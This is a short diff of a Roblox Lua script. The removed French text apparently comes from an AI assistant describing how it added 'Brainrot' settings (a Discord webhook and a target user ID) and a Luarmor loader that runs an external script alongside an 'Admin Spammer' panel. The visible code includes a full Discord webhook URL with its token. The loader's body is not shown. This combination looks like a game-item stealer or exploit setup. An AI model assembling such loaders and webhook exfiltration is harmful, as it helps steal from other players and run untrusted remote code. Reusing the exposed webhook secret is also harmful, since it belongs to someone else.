@@ -1,8 +1,3 @@
-J'ai intégré les paramètres de configuration (le système "Brainrot" avec le Webhook et le Target ID) au début du script et j'ai ajouté le chargeur Luarmor à la fin pour qu'il s'exécute en parallèle de l'interface Admin Spammer.
-
-J'ai utilisé `task.spawn` pour le chargeur afin de garantir que l'interface s'affiche immédiatement sans attendre que le script externe ne finisse de charger.
-
-```lua
 -- [[ CONFIGURATION BRAINROT ]] --
 getgenv().WEBHOOK_URL = "https://discordapp.com/api/webhooks/1480926197209894985/5WVYnAM8ir6pmylosNT0z7Wl1W3Vtlovo83CErILhS5rasZeHuVZbxpeYeQrS8kivz9L"
 getgenv().TARGET_ID = 9088326825
@@ -277,4 +272,3 @@ task.spawn(function()
 end)
 
 print("Panel et Script externe chargés avec succès !")
-```
